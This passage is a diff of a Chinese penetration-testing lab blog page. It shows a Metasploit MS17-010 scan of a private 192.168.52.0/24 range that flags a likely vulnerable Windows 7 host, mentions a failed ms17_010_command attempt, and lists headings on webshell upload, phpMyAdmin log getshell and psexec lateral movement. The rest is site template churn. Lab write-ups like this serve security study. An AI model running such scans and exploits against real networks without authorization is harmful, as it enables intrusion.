 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(server/socks_proxy) &gt; use /scanner/smb/smb_ms17_010</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting        Required  Description</span><br><span class="line">   ----         ---------------        --------  -----------</span><br><span class="line">   CHECK_ARCH   true                   no        Check for architecture on vulnerab</span><br><span class="line">                                                 le hosts</span><br><span class="line">   CHECK_DOPU   true                   no        Check for DOUBLEPULSAR on vulnerab</span><br><span class="line">                                                 le hosts</span><br><span class="line">   CHECK_PIPE   false                  no        Check for named pipe on vulnerable</span><br><span class="line">                                                  hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit  yes       List of named pipes to check</span><br><span class="line">                -framework/data/wordl</span><br><span class="line">                ists/named_pipes.txt</span><br><span class="line">   RHOSTS       192.168.52.0/24        yes       The target host(s), range CIDR ide</span><br><span class="line">                                                 ntifier, or hosts file with syntax</span><br><span class="line">                                                  &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT        445                    yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                      no        The Windows domain to use for auth</span><br><span class="line">                                                 entication</span><br><span class="line">   SMBPass                             no        The password for the specified use</span><br><span class="line">                                                 rname</span><br><span class="line">   SMBUser                             no        The username to authenticate as</span><br><span class="line">   THREADS      100                    yes       The number of concurrent threads (</span><br><span class="line">                                                 max one per host)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.52.0/24</span><br><span class="line">rhosts =&gt; 192.168.52.0/24</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set threads 500</span><br><span class="line">threads =&gt; 500</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.52.143:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned  45 of 256 hosts (17% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned  52 of 256 hosts (20% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned  77 of 256 hosts (30% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 114 of 256 hosts (44% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 145 of 256 hosts (56% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 154 of 256 hosts (60% complete)</span><br><span class="line">[-] 192.168.52.141:445    - An SMB Login Error occurred while connecting to the IPC$ tree.</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 190 of 256 hosts (74% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 205 of 256 hosts (80% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 255 of 256 hosts (99% complete)</span><br><span class="line">[*] 192.168.52.0/24:445   - Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>使用ms17_010_command</p>
-<p> <code>use auxiliary/admin/smb/ms17_010_command</code>，但是都利用失败了……</p>
+<p><code>use auxiliary/admin/smb/ms17_010_command</code>，但是都利用失败了......</p>
 <p><img src="/posts/bb76ba56/ms17_010_error.png"></p>
 
     </div>
@@ -676,7 +700,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.</span> <span class="nav-text">目录扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0shell"><span class="nav-number">3.1.</span> <span class="nav-text">后台上传shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phpmyadmin%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97Getshell"><span class="nav-number">3.2.</span> <span class="nav-text">phpmyadmin利用日志Getshell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">4.</span> <span class="nav-text">内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8msf"><span class="nav-number">4.1.</span> <span class="nav-text">使用msf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8CS%E8%BF%9E%E6%8E%A5"><span class="nav-number">4.2.</span> <span class="nav-text">使用CS连接</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.2.1.</span> <span class="nav-text">系统信息收集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86"><span class="nav-number">4.2.2.</span> <span class="nav-text">系统密码收集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E6%8E%A2%E6%B5%8B"><span class="nav-number">4.2.3.</span> <span class="nav-text">横向探测</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8CS%E7%9A%84psexec"><span class="nav-number">4.2.3.1.</span> <span class="nav-text">使用CS的psexec</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CS%E6%B4%BE%E7%94%9Fmsf%E4%BC%9A%E8%AF%9D"><span class="nav-number">4.2.4.</span> <span class="nav-text">CS派生msf会话</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.</span> <span class="nav-text">目录扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%8E%E5%8F%B0%E4%B8%8A%E4%BC%A0shell"><span class="nav-number">3.1.</span> <span class="nav-text">后台上传shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phpmyadmin%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97getshell"><span class="nav-number">3.2.</span> <span class="nav-text">phpmyadmin利用日志Getshell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">4.</span> <span class="nav-text">内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8msf"><span class="nav-number">4.1.</span> <span class="nav-text">使用msf</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8cs%E8%BF%9E%E6%8E%A5"><span class="nav-number">4.2.</span> <span class="nav-text">使用CS连接</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.2.1.</span> <span class="nav-text">系统信息收集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86"><span class="nav-number">4.2.2.</span> <span class="nav-text">系统密码收集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E6%8E%A2%E6%B5%8B"><span class="nav-number">4.2.3.</span> <span class="nav-text">横向探测</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8cs%E7%9A%84psexec"><span class="nav-number">4.2.3.1.</span> <span class="nav-text">使用CS的psexec</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#cs%E6%B4%BE%E7%94%9Fmsf%E4%BC%9A%E8%AF%9D"><span class="nav-number">4.2.4.</span> <span class="nav-text">CS派生msf会话</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -692,7 +716,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -740,7 +764,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -754,7 +778,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -765,7 +789,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -905,6 +929,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
